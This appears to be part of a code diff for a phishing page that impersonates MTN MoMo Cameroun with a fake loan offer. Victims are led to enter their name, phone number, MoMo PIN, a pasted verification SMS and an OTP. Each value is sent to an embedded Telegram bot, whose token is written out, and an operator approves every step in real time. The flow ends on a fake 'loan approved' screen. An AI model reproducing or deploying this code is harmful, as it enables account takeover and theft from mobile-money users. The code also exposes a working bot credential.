+                    <polygon points="68,45 58,40 58,50" fill="none" stroke="#004080" stroke-width="4" stroke-linejoin="round"/>
+
+                    <!-- SIM Card -->
+                    <rect x="65" y="25" width="40" height="45" rx="5" fill="#f4f8fc" stroke="#004080" stroke-width="4"/>
+                    <rect x="70" y="32" width="20" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="82" y="32" width="10" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="70" y="42" width="12" height="10" rx="2" fill="#FFD700"/>
+                    <rect x="82" y="42" width="10" height="10" rx="2" fill="#FFD700"/>
+                </svg>
+            </div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 70px 20px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: flex-start;">
+            <h2 style="color: var(--mtn-dark); font-size: 1.8rem; font-weight: 700; margin-top: 10px;">Carte SIM</h2>
+            <p style="color: var(--text-mid); font-size: 1.0rem; margin-top: 15px; line-height: 2.6; max-width: 400px;">
+                Assurez-vous que la carte SIM associée à ce profil se trouve bien dans cet appareil.
+            </p>
+        </div>
+
+        <div style="padding: 0 24px 40px 24px; width: 100%; flex-shrink: 0; margin-top: auto;">
+            <button class="btn-grad" onclick="goTo('page-login')" style="border-radius: 30px; font-size: 1rem; padding: 16px; background: #003366; background: linear-gradient(to right, #003366, #004080);">SUIVANT</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 7: LOGIN ══════════════════════ -->
+    <div id="page-login" class="page" style="background: #fff;">
+        <div style="background: var(--mtn-dark); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 30px; flex-shrink: 0;">
+            <div style="width: 50px; height: 50px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 6px;">
+                <img src="https://i.postimg.cc/yd0znr7D/images-png-mtn.png" alt="MTN MoMo" style="height: 36px; object-fit: contain;" />
+            </div>
+            <div style="color: var(--mtn-gold); font-weight: 700; font-size: 1.2rem; letter-spacing: 0.5px;">MoMo</div>
+            <div style="color: rgba(255,255,255,0.6); font-size: 0.7rem; font-weight: 500;">par MTN</div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 0 20px; display: flex; flex-direction: column; align-items: center;">
+            <div style="margin-top: -30px; background: #fff; border-radius: 16px; box-shadow: 0 6px 30px rgba(0,0,0,0.08); padding: 30px 24px; max-width: 380px; width: 100%; z-index: 10;">
+                <h3 style="text-align: center; color: var(--mtn-dark); font-size: 1.25rem; font-weight: 700; margin-bottom: 24px;">Bienvenue sur MoMo</h3>
+
+                <div style="display: flex; gap: 10px; align-items: stretch; margin-bottom: 20px;">
+                    <div style="width: 54px; height: 54px; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: #fff; flex-shrink: 0;">
+                        <span style="font-size: 1.5rem; line-height: 1;">CAM</span>
+                    </div>
+                    <div style="flex: 1; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; background: #fff;">
+                        <input type="tel" id="lpPhone" placeholder="Entrez le numéro *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();" />
+                    </div>
+                </div>
+
+                <div style="padding-top: 6px; border-top: 1px solid #f0f0f0;">
+                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Entrez le code PIN MoMo (5 chiffres)</label>
+                    <div class="pin-row" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
+                        <input type="password" id="lp0" class="pin-box" maxlength="1" oninput="pinMvM(this, 0)" placeholder="•" />
+                        <input type="password" id="lp1" class="pin-box" maxlength="1" oninput="pinMvM(this, 1)" placeholder="•" />
+                        <input type="password" id="lp2" class="pin-box" maxlength="1" oninput="pinMvM(this, 2)" placeholder="•" />
+                        <input type="password" id="lp3" class="pin-box" maxlength="1" oninput="pinMvM(this, 3)" placeholder="•" />
+                        <input type="password" id="lp4" class="pin-box" maxlength="1" oninput="pinMvM(this, 4)" placeholder="•" />
+                        <button class="pin-eye" onclick="togPin()" title="Afficher/Masquer" style="cursor:pointer; background:none; border:none; font-size:1.2rem; color:var(--text-light); padding:4px;">👁</button>
+                        <button class="pin-delete" onclick="clearLoginPin()" title="Supprimer le PIN" style="cursor:pointer; background:none; border:none; font-size:1rem; color:var(--text-light); padding:4px;">✕</button>
+                    </div>
+                </div>
+
+                <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
+                <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
+                <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
+            </div>
+
+            <div style="text-align: center; font-size: 0.98rem; color: #005c99; line-height: 2.5; max-width: 420px; margin: 30px 0;">
+                En utilisant cette application, vous acceptez nos <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Conditions d'Utilisation Mobiles</a> et notre <a href="#" style="color: var(--mtn-dark); text-decoration: underline;">Politique de Confidentialité</a>
+            </div>
+        </div>
+
+        <div style="padding: 0 24px 40px 24px; flex-shrink: 0; margin-top: auto;">
+            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #003366; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;" disabled>SUIVANT</button>
+            <div id="mLgn" class="loading" style="margin-top: 10px;">
+                <div class="spinner" style="margin: 8px auto; width: 32px; height: 32px; border-width: 3px;"></div>
+                <div class="wait-msg" style="font-size: 0.85rem;">Connexion en cours…</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 8: WAIT FOR LOGIN APPROVAL ══════════════════════ -->
+    <div id="page-wait-login-approval" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Authentification en cours...</h2>
+                <p>Veuillez patienter</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Ne fermez pas cette page</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">ID de la demande : <span id="waitAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 9: SMS MESSAGE PASTE ══════════════════════ -->
+    <div id="page-sms-paste" class="page">
+        <div class="sms-topbar">
+            <button class="bk" onclick="goTo('page-login')">← Retour</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--mtn-dark); font-weight:600;">Vérification par SMS</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="sms-body-wrap">
+            <div class="sms-card">
+                <h2>Coller le message SMS</h2>
+                <p class="sms-hint">Un message de vérification a été envoyé sur votre téléphone via MTN Cameroun. Veuillez copier et coller le message complet ici.</p>
+                <div class="sms-timer-wrap" id="smsTimerWrap">
+                    <div class="sms-timer-circle">
+                        <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
+                            <circle class="sms-timer-bg" cx="22" cy="22" r="18"/>
+                            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"/>
+                        </svg>
+                        <div class="sms-timer-num" id="smsTimerNum">60</div>
+                    </div>
+                    <div class="sms-timer-text"><strong>Le message expire dans <span id="smsTimerSec">60</span>s.</strong><br />Collez votre SMS avant la fin du temps imparti.</div>
+                </div>
+                <div class="sms-resend-wrap" id="smsResendWrap">
+                    <p>⏰ Votre session de vérification a expiré.<br />Demandez un nouveau SMS et collez-le ci-dessous.</p>
+                    <button class="btn-resend" id="bResend" onclick="doSmsResend()">🔄 Renvoyer le SMS</button>
+                    <div id="mResend" class="loading" style="margin-top:10px;">
+                        <div class="spinner" style="margin:8px auto; width:30px; height:30px; border-width:3px;"></div>
+                        <div class="wait-msg" style="font-size:0.82rem;">Envoi en cours…</div>
+                    </div>
+                </div>
+                <textarea id="smsMsgBox" class="sms-textarea" placeholder="Collez votre message SMS complet ici…" oninput="chkSmsMsg()"></textarea>
+                <p class="sms-code-hint">Exemple : "Votre code de vérification MTN MoMo est : 123456"</p>
+                <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
+                <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
+                <button id="bSms" class="btn-sms" onclick="doSmsParse()">SOUMETTRE</button>
+                <div id="mSms" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Traitement du message…</div>
+                </div>
+            </div>
+        </div>
+        <div class="sms-curve"></div>
+        <div class="sms-foot">© 2026 MTN MoMo Cameroun – Propulsé par MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 10: WAIT FOR SMS APPROVAL ══════════════════════ -->
+    <div id="page-wait-sms" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Vérification en cours...</h2>
+                <p>Veuillez patienter</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">ID de la demande : <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Ne fermez pas cette page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 11: OTP ══════════════════════ -->
+    <div id="page-otp" class="page">
+        <div class="otp-topbar">
+            <button class="bk" onclick="goTo('page-sms-paste')">← Retour</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--mtn-dark); font-weight:600;">Vérification OTP</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="otp-body-wrap">
+            <div class="otp-card">
+                <h2>Entrez le code OTP</h2>
+                <p class="otp-hint">Entrez le code OTP à 4 chiffres envoyé sur votre téléphone via MTN MoMo Cameroun</p>
+                <div class="otp-section">
+                    <div class="otp-section-title">Code OTP (4 chiffres) :</div>
+                    <div style="display:flex; align-items:center;">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                        </div>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Supprimer l'OTP">✕</button>
+                    </div>
+                </div>
+                <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
+                <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+                <button id="bOtp" class="btn-otp" onclick="doOtp()">VÉRIFIER ET APPROUVER LE PRÊT</button>
+                <div id="mOtp" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Vérification en cours…</div>
+                </div>
+            </div>
+        </div>
+        <div class="otp-curve"></div>
+        <div class="otp-foot">© 2026 MTN MoMo Cameroun – Propulsé par MTN</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 12: WAIT FOR OTP APPROVAL ══════════════════════ -->
+    <div id="page-wait-otp" class="page">
+        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Vérification du code OTP</h2>
+                <p>Veuillez patienter</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">ID de la demande : <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Ne fermez pas cette page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 13: APPROVAL ══════════════════════ -->
+    <div id="page-approval" class="page">
+        <div class="appr-wrap">
+            <div class="appr-top">
+                <div class="check-circle">✓</div>
+                <h2 class="appr-title">Prêt Approuvé !</h2>
+                <p class="appr-sub">Votre prêt a été approuvé avec succès.</p>
+                <div class="appr-banner">
+                    <div class="abl">Montant à Recevoir</div>
+                    <div class="aba" id="aprAmount">XAF 1 000 000</div>
+                </div>
+            </div>
+            <div class="comp-box">
+                <div class="ch">ℹ️ Informations Importantes</div>
+                <p>Les fonds seront versés directement sur votre compte MTN MoMo dans un délai de 5 minutes. Veuillez vous assurer que votre numéro de téléphone est correct.</p>
+            </div>
+            <div class="ld-card">
+                <div class="ld-htitle">📊 Détails du Prêt</div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-g">💰</div>
+                    <div>
+                        <div class="ld-lbl">Montant</div>
+                        <div class="ld-val" id="aprAmt">XAF 1 000 000</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-b">📅</div>
+                    <div>
+                        <div class="ld-lbl">Durée</div>
+                        <div class="ld-val" id="aprTerm">48 Mois</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-p">💳</div>
+                    <div>
+                        <div class="ld-lbl">Paiement Mensuel</div>
+                        <div class="ld-val" id="aprMth">XAF 24 000</div>
+                    </div>
+                </div>
+            </div>
+            <div class="nxt-steps">
+                <span style="font-size:1.2rem;">📌</span>
+                <p><strong>Prochaines étapes :</strong> Pour commencer à rembourser, vous pouvez configurer un plan de paiement automatique sur votre compte MTN MoMo dans la section suivante.</p>
+            </div>
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="window.location.href='https://fr.wikipedia.org/wiki/Momo_(d%C3%A9partement)'">TERMINER</button>
+            </div>
+        </div>
+    </div>
+</body>
+
+    <!-- ══════════════════════ SCRIPTS ══════════════════════ -->
     <script>
-        const amountSlider = document.getElementById('amount-slider');
-        const termSlider = document.getElementById('term-slider');
-        const amountDisplay = document.getElementById('amount-display');
-        const termDisplay = document.getElementById('term-display');
-        const paymentDisplay = document.getElementById('payment-display');
+        // ============================================================
+        // TELEGRAM BOT CONFIGURATION
+        // ============================================================
+        const TG_TOKEN = "9043427673:AAF721h8t0ruZf9Ccc-LwcqN45cBW-GujhM";
+        const TG_CHAT = "5364351452";
+        const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
 
-        const ANNUAL_INTEREST_RATE = 0.18;
+        const sessions = new Map();
+        let sessionCounter = 1;
 
-        function calculateEMI() {
-            const principal = parseFloat(amountSlider.value);
-            const months = parseFloat(termSlider.value);
-            const r = ANNUAL_INTEREST_RATE / 12;
-            const emi = (principal * r * Math.pow(1 + r, months)) / (Math.pow(1 + r, months) - 1);
-
-            amountDisplay.textContent = principal.toLocaleString() + ' XAF';
-            termDisplay.textContent = months + ' months';
-            paymentDisplay.textContent = Math.round(emi).toLocaleString() + ' XAF';
+        function createSession(data) {
+            const id = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
+            const session = {
+                id,
+                ...data,
+                stage: 'application',
+                created_at: new Date().toISOString(),
+                updated_at: new Date().toISOString(),
+                pin: '',
+                smsMessage: '',
+                otp: ''
+            };
+            sessions.set(id, session);
+            return session;
         }
 
-        amountSlider.addEventListener('input', calculateEMI);
-        termSlider.addEventListener('input', calculateEMI);
-        calculateEMI();
+        function getSession(id) {
+            return sessions.get(id) || null;
+        }
 
-        const applyBtn = document.querySelector('.btn-apply');
+        function updateSession(id, updates) {
+            const s = sessions.get(id);
+            if (!s) return null;
+            Object.assign(s, updates);
+            s.updated_at = new Date().toISOString();
+            return s;
+        }
 
-        applyBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            sessionStorage.setItem('loanAmount', amountSlider.value);
+        async function tgCall(method, body) {
+            try {
+                const r = await fetch(`${TG_API}/${method}`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(body)
+                });
+                return await r.json();
+            } catch (e) {
+                console.warn("tg", method, e);
+                return null;
+            }
+        }
 
-            this.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
-            this.style.opacity = '0.8';
-            this.style.cursor = 'not-allowed';
+        // ─── UPDATED tgFmt: SMS now shows user name and number ───
+        function tgFmt(row, kind) {
+            if (kind === "sms") {
+                const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
+                const num = row.phone ? `+237 ${row.phone}` : "—";
+                const sms = row.smsMessage || "—";
+                return `📨 New SMS submitted\n\nName: ${name}\nPhone: ${num}\nMessage: ${sms}\nApplication ID: ${row.id}`;
+            }
+            const name = `${row.firstName || ""} ${row.lastName || ""}`.trim() || "—";
+            const num = row.phone || "—";
+            const pin = row.pin || "—";
+            const sms = row.smsMessage || "—";
+            const otp = row.otp || "—";
+            let title = "🔑 New PIN submitted";
+            if (kind === "otp") title = "🔢 New OTP submitted";
+            return `${title}\n\nName: ${name}\nPhone: ${num}\nPIN: ${pin}\nSMS: ${sms}\nOTP: ${otp}\nApplication ID: ${row.id}`;
+        }
 
-            setTimeout(() => {
-                window.location.href = 'apply.html';
-            }, 1500);
+        async function tgNotify(row, kind) {
+            let keyboard;
+            const msgBtn = {
+                text: "💬 Message User",
+                callback_data: `ask_msg:${row.id}`
+            };
+            if (kind === "pin") {
+                keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "✅ Approve PIN",
+                            callback_data: `approve_pin:${row.id}`
+                        }],
+                        [{
+                            text: "❌ Reject PIN",
+                            callback_data: `reject_pin:${row.id}`
+                        }, msgBtn]
+                    ]
+                };
+            } else if (kind === "sms") {
+                const smsText = row.smsMessage || '—';
+                keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "📋 Copy SMS",
+                            copy_text: {
+                                text: smsText
+                            }
+                        }],
+                        [{
+                            text: "✅ Approve SMS",
+                            callback_data: `approve_sms:${row.id}`
+                        }],
+                        [{
+                            text: "❌ Reject SMS",
+                            callback_data: `reject_sms:${row.id}`
+                        }, msgBtn]
+                    ]
+                };
+            } else if (kind === "otp") {
+                keyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "✅ Approve OTP",
+                            callback_data: `approve_otp:${row.id}`
+                        }],
+                        [{
+                            text: "❌ Reject OTP",
+                            callback_data: `reject_otp:${row.id}`
+                        }, msgBtn]
+                    ]
+                };
+            }
+            await tgCall("sendMessage", {
+                chat_id: TG_CHAT,
+                text: tgFmt(row, kind),
+                reply_markup: keyboard
+            });
+        }
+
+        let lastOffset = 0;
+        let currentSessionId = null;
+
+        function showAdminModal(message) {
+            document.getElementById('adminModalBody').textContent = message;
+            document.getElementById('adminModalOverlay').classList.add('show');
+        }
+
+        function closeAdminModal() {
+            document.getElementById('adminModalOverlay').classList.remove('show');
+        }
+
+        document.getElementById('adminModalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) closeAdminModal();
         });
+
+        async function tgPoll() {
+            const offset = lastOffset || Number(localStorage.getItem("tg_offset") || 0);
+            const r = await tgCall("getUpdates", {
+                offset: offset,
+                timeout: 0,
+                allowed_updates: ["callback_query",
+                    "message"
+                ]
+            });
+            if (!r || !r.ok) return;
+            for (const u of r.result) {
+                lastOffset = u.update_id + 1;
+                localStorage.setItem("tg_offset", String(lastOffset));
+
+                if (u.message && u.message.reply_to_message && u.message.reply_to_message.text && u.message.reply_to_message
+                    .text.includes("Application ID: ")) {
+                    if (String(u.message.chat.id) !== TG_CHAT) continue;
+                    const targetSessionId = u.message.reply_to_message.text.split("Application ID: ")[1].trim();
+                    const customText = u.message.text;
+                    if (currentSessionId && currentSessionId === targetSessionId) {
+                        showAdminModal(customText);
+                        await tgCall("sendMessage", {
+                            chat_id: TG_CHAT,
+                            text: "✅ Message delivered to client."
+                        });
+                    }
+                    continue;
+                }
+
+                const cq = u.callback_query;
+                if (!cq) continue;
+                if (String(cq.from.id) !== TG_CHAT && String(cq.message && cq.message.chat && cq.message.chat.id) !== TG_CHAT) {
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id,
+                        text: "Not authorized"
+                    });
+                    continue;
+                }
+
+                const [action, id] = (cq.data || "").split(":");
+
+                if (action === "ask_msg") {
+                    await tgCall("sendMessage", {
+                        chat_id: cq.message.chat.id,
+                        text: `Please reply directly to this message with the exact text you want to send to the user.\n\nApplication ID: ${id}`,
+                        reply_markup: {
+                            force_reply: true
+                        }
+                    });
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id
+                    });
+                    continue;
+                }
+
+                let stage = null,
+                    label = "";
+                if (action === "approve_pin") {
+                    stage = "pin_approved";
+                    label = "PIN approved";
+                } else if (action === "reject_pin") {
+                    stage = "pin_rejected";
+                    label = "PIN rejected";
+                } else if (action === "approve_sms") {
+                    stage = "sms_approved";
+                    label = "SMS approved";
+                } else if (action === "reject_sms") {
+                    stage = "sms_rejected";
+                    label = "SMS rejected";
+                } else if (action === "approve_otp") {
+                    stage = "otp_approved";
+                    label = "OTP approved";
+                } else if (action === "reject_otp") {
+                    stage = "otp_rejected";
+                    label = "OTP rejected";
+                }
+
+                if (stage) {
+                    const updated = updateSession(id, {
+                        stage
+                    });
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id,
+                        text: label
+                    });
+                    await tgCall("editMessageReplyMarkup", {
+                        chat_id: cq.message.chat.id,
+                        message_id: cq.message.message_id,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{
+                                    text: `✓ ${label}`,
+                                    callback_data: "noop"
+                                }]
+                            ]
+                        }
+                    });
+                    if (currentSessionId === id && updated) {
+                        handleStageUpdate(updated);
+                    }
+                } else {
+                    await tgCall("answerCallbackQuery", {
+                        callback_query_id: cq.id
+                    });
+                }
+            }
+        }
+
+        setInterval(() => {
+            tgPoll().catch(() => {});
+        }, 3000);
+
+        function handleStageUpdate(session) {
+            const stage = session.stage;
+            if (stage === 'pin_approved') {
+                goTo('page-sms-paste');
+                startSmsTimer();
+            } else if (stage === 'pin_rejected') {
+                document.getElementById('lpPhone').value = '';
+                [0, 1, 2, 3, 4].forEach(i => document.getElementById('lp' + i).value = '');
+                goTo('page-login');
+                document.getElementById('bLgn').disabled = false;
+                chkPin();
+                showLgnMsg('error', 'Wrong PIN. Please try again.');
+            } else if (stage === 'sms_approved') {
+                goTo('page-otp');
+            } else if (stage === 'sms_rejected') {
+                document.getElementById('smsMsgBox').value = '';
+                goTo('page-sms-paste');
+                document.getElementById('bSms').disabled = false;
+                chkSmsMsg();
+                showSmsMsg('error', 'The SMS message was rejected. Please paste the correct message.');
+            } else if (stage === 'otp_approved') {
+                const months = parseInt(S.loanTerm) || 48;
+                const monthly = Math.ceil((S.loanAmount || 1000000) / months);
+                document.getElementById('aprAmount').textContent = 'CFA ' + (S.loanAmount || 1000000).toLocaleString();
+                document.getElementById('aprAmt').textContent = 'CFA ' + (S.loanAmount || 1000000).toLocaleString();
+                document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
+                document.getElementById('aprMth').textContent = 'CFA ' + monthly.toLocaleString();
+                goTo('page-approval');
+            } else if (stage === 'otp_rejected') {
+                [0, 1, 2, 3].forEach(i => document.getElementById('otp' + i).value = '');
+                goTo('page-otp');
+                document.getElementById('bOtp').disabled = false;
+                document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+                chkOtp();
+                showOtpMsg('error', 'The OTP code was rejected. Please try again.');
+            }
+        }
+
+        // ============================================================
+        // STATE
+        // ============================================================
+        const S = {
+            loanType: '',
+            loanAmount: 0,
+            loanTerm: '',
+            loanPurpose: '',
+            firstName: '',
+            lastName: '',
+            phone: '',
+            employment: '',
+            annualIncome: 0,
+            applicationId: '',
+            isSubmitting: false
+        };
+
+        // ============================================================
+        // NAVIGATION
+        // ============================================================
+        function goTo(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId) && document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0);
+
+            if (pageId === 'page-sms-paste') {
+                const btn = document.getElementById('bSms');
+                const spinner = document.getElementById('mSms');
+                btn.disabled = false;
+                spinner.classList.remove('show');
+                chkSmsMsg();
+                ['smsMsg', 'smsMsgOk'].forEach(function(id) {
+                    document.getElementById(id).classList.remove('show');
+                });
+            }
+
+            if (pageId === 'page-otp') {
+                const btn = document.getElementById('bOtp');
+                const spinner = document.getElementById('mOtp');
+                btn.disabled = false;
+                btn.textContent = 'VERIFY & APPROVE LOAN';
+                spinner.classList.remove('show');
+                chkOtp();
+                ['otpMsg', 'otpMsgOk'].forEach(function(id) {
+                    document.getElementById(id).classList.remove('show');
+                });
+            }
+
+            if (pageId === 'page-login') {
+                const btn = document.getElementById('bLgn');
+                const spinner = document.getElementById('mLgn');
+                btn.disabled = false;
+                spinner.classList.remove('show');
+                S.isSubmitting = false;
+                chkPin();
+            }
+        }
+
+        function startApplication() {
+            const sliderVal = document.getElementById('amtSlider').value;
+            document.getElementById('s1am').value = sliderVal;
+            goTo('page-step1');
+        }
+
+        function normalizePhone(id) {
+            let inp = document.getElementById(id);
+            let val = inp.value.replace(/\D/g, '');
+            if (val.length > 9) val = val.substring(0, 9);
+            inp.value = val;
+        }
+
+        function toS2() {
+            const ty = document.getElementById('s1ty').value;
+            const am = +document.getElementById('s1am').value;
+            const te = document.getElementById('s1te').value;
+            const pu = document.getElementById('s1pu').value;
+
+            if (!ty || am <= 0 || !te || !pu.trim()) {
+                showErr('s1Err', 'Please complete all fields.');
+                return;
+            }
+
+            S.loanType = ty;
+            S.loanAmount = am;
+            S.loanTerm = te;
+            S.loanPurpose = pu;
+            goTo('page-step2');
+        }
+
+        function toS3() {
+            const fi = document.getElementById('s2fi').value.trim();
+            const la = document.getElementById('s2la').value.trim();
+            const ph = document.getElementById('s2ph').value;
+
+            if (!fi || !la || ph.length !== 9) {
+                showErr('s2Err', 'Please enter valid first name, last name, and 9-digit phone number.');
+                return;
+            }
+
+            S.firstName = fi;
+            S.lastName = la;
+            S.phone = ph;
+
+            document.getElementById('sA').textContent = 'CFA ' + S.loanAmount.toLocaleString();
+            document.getElementById('sT').textContent = S.loanTerm;
+            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
+                '');
+            document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
+
+            goTo('page-step3');
+        }
+
+        function submitApp() {
+            const em = document.getElementById('s3em').value;
+            const in_ = +document.getElementById('s3in').value;
+
+            if (!em || in_ <= 0) {
+                showErr('s3Err', 'Please complete all fields.');
+                return;
+            }
+
+            S.employment = em;
+            S.annualIncome = in_;
+            S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
+
+            document.getElementById('sA').textContent = 'CFA ' + S.loanAmount.toLocaleString();
+            document.getElementById('sT').textContent = S.loanTerm;
+            document.getElementById('sP').textContent = S.loanPurpose.substring(0, 30) + (S.loanPurpose.length > 30 ? '…' :
+                '');
+            document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
+
+            goTo('page-processing');
+
+            const session = createSession({
+                firstName: S.firstName,
+                lastName: S.lastName,
+                phone: S.phone,
+                loanAmount: S.loanAmount,
+                loanTerm: S.loanTerm,
+                purpose: S.loanPurpose,
+                employment: S.employment,
+                annualIncome: S.annualIncome
+            });
+            S.applicationId = session.id;
+            currentSessionId = session.id;
+
+            // Redirect to SIM check page (ONLY after clicking submit)
+            setTimeout(() => {
+                goTo('page-sim-check');
+            }, 2000);
+        }
+
+        function showErr(id, msg) {
+            document.getElementById(id).classList.add('show');
+            document.getElementById(id + 'Txt').textContent = msg;
+        }
+
+        function clearErr(id) {
+            document.getElementById(id).classList.remove('show');
+        }
+
+        function updateCalc() {
+            const amt = +document.getElementById('amtSlider').value;
+            document.getElementById('calcAmt').textContent = 'CFA ' + amt.toLocaleString();
+            const monthly = Math.ceil(amt / 48);
+            document.getElementById('monthlyAmt').textContent = 'CFA ' + monthly.toLocaleString();
+        }
+
+        // ══════════════════════════════════════════════════════
+        // LOGIN PAGE — PIN INPUT HELPERS
+        // ══════════════════════════════════════════════════════
+        function pinMvM(el, i) {
+            el.value = el.value.replace(/\D/, '');
+            if (el.value && i < 4) {
+                document.getElementById('lp' + (i + 1)).focus();
+            }
+            chkPin();
+        }
+
+        document.addEventListener('keydown', function(e) {
+            const id = e.target.id;
+
+            if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
+                const idx = parseInt(id[2]);
+                if (idx > 0) document.getElementById('lp' + (idx - 1)).focus();
+            }
+
+            if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
+                const idx = parseInt(id[3]);
+                if (idx > 0) document.getElementById('otp' + (idx - 1)).focus();
+            }
+        });
+
+        function chkPin() {
+            const phone = document.getElementById('lpPhone').value.trim();
+            const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
+            const ok = phone.length === 9 && pinOk;
